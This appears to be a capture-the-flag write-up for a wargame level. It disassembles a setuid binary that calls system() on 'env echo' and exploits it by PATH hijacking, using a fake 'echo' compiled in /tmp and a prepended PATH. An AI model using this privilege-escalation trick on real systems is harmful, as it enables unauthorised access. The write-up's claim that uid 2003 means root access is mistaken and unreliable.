level03 folder contains AN ELF 32 executable
using the gdb we get this in the main dump

(gdb) disassemble main
Dump of assembler code for function main:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	and    $0xfffffff0,%esp
   0x080484aa <+6>:	sub    $0x20,%esp
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    %eax,0x18(%esp)
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    %eax,0x1c(%esp)
   0x080484bf <+27>:	mov    0x18(%esp),%eax
   0x080484c3 <+31>:	mov    %eax,0x8(%esp)
   0x080484c7 <+35>:	mov    0x18(%esp),%eax
   0x080484cb <+39>:	mov    %eax,0x4(%esp)
   0x080484cf <+43>:	mov    0x18(%esp),%eax
   0x080484d3 <+47>:	mov    %eax,(%esp)
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:	mov    0x1c(%esp),%eax
   0x080484df <+59>:	mov    %eax,0x8(%esp)
   0x080484e3 <+63>:	mov    0x1c(%esp),%eax
   0x080484e7 <+67>:	mov    %eax,0x4(%esp)
   0x080484eb <+71>:	mov    0x1c(%esp),%eax
   0x080484ef <+75>:	mov    %eax,(%esp)
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave
   0x08048504 <+96>:	ret
End of assembler dump.

when the executible is run it displays "Exploit me"

inspection of the .rodata section reveals that it runs the following code "/usr/bin/env echo Exploit me"
-This code means it goes to the environment variables and looks at the PATH variable. In the paths listed it looks for the executable 'echo' , runs it and passes the arguments 'Exploit me' to it

We take a further look athe the disassembled main and see that it calls geteuid(),getegid(), setresgid() and setresuid()
The get functions get the groupID and userId of the calling process
the set functions set the groupID and userId of the calling process

we then run ltrace ./level03
which reveals that it calls setuid with the following parameters (2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)
This means that the program gives the calling process root access before executing "/usr/bin/env echo Exploit me"

With root access we can trick the program into running our own little program with root access to get the flag

After some struggling we realise that the /tmp folder has write rights

there we write our own little echo in the /tmp folder
int main()
{ system("/bin/getflag"); return 0;}

We compile it  'gcc ourecho.c -o echo"... The name should echo since its echo in the binary

then now we just have to trick the program into reading our echo first before the original one

we do this by appendind the path to our echo at the beginning of the environment vairable PATH
- PATH=/tmp/:$PATH

now if we run level03
we get the flag yaaay...
